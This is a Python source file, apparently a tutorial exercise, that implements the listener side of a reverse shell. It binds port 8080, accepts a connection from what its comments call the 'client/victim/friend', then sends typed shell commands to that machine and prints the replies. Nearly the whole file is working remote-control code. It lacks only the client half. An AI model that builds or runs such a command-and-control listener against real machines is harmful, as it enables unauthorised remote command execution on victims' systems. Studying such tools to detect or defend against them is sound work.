import socket # for the BSD socket module
import sys # Command Line Arguments, Working with Modules && more

# creation of the reverse_socket
def create_reverse_server_socket():
    try:
        global host
        global port
        global reverse_server_socket
        
        host = ""
        port = 8080
        reverse_server_socket = socket.socket()
        
    except socket.error as error_msg:
        
        print("SocketCreationError: " + str(error_msg))
        
# Binding the socket && listening for connections
def bind_reverse_socket():
    try:
        global host
        global port
        global reverse_server_socket
        
        print("Binding The Port: " + str(port))
        
        reverse_server_socket.bind((host, port))
        
        reverse_server_socket.listen()
        
    except socket.error as error_msg2:
        
        print("SocketBindingError: " + str(error_msg2) + "\n" + "Retrying...")
        
        bind_reverse_socket() # recursion used here tot retry binding the port
        
# enstablish a connection with the client/victim/friend
def reverse_socket_accept(): # this function blocks until a connection has been enstablished with the client
    
    connection_object, address_tuple = reverse_server_socket.accept() # the accept function has 2 return values: the connection_object && the address_tuple hence we need the 2 variables each to receive one of the 2 return values from the accept()
    
    print("connection has been enstablished! " + "IP " + address_tuple[0] + " | Port " + str(address_tuple[1]))
    
    send_command_to_client(connection_object) # calling it inside the reverse_socket_accept() to send the commands once the connection has been enstablished
    
    connection_object.close() # close the new socket that was used for the data exchange
        
# send commands to the client/victim or a friend
def send_command_to_client(connect_to_client):
    
    while True:
        
        command_input = input() # get the command to be sent to the client from the server
        
        if command_input == "quit".lower(): # if the server gets a "quit" as an input()
            
            connect_to_client.close() # quit sending commands to the client
            
            reverse_server_socket.close() # close the connection to the client
            
            sys.exit() # exit the shell or CMD prompt after closing the connection to the client
            
        if len(str.encode(command_input)) > 0: # if the __len__() command_input converted to bytes is greater than 0
            
            connect_to_client.send(str.encode(command_input)) # send as a byte literal && not a string literal
            
            receive_client_response = str(connect_to_client.recv(1024), encoding="utf-8", errors="strict") # convert the received data from the client into a string literal since it is sent as a byte literal over the network
            
            print(receive_client_response, end="")

# calling all the above defined functions in the main functions
def main(): 
    
    create_reverse_server_socket() # first create_reverse_server_socket() is called to create the socket object
    
    bind_reverse_socket() # the we bind_reverse_socket() the socket to a specific port
    
    reverse_socket_accept() # accept connections and hence start sending the commands once the connection has been enstablished
 
# call the main function only when executing the file directly and not as a module 
if __name__ == "__main__":  
    main()   
    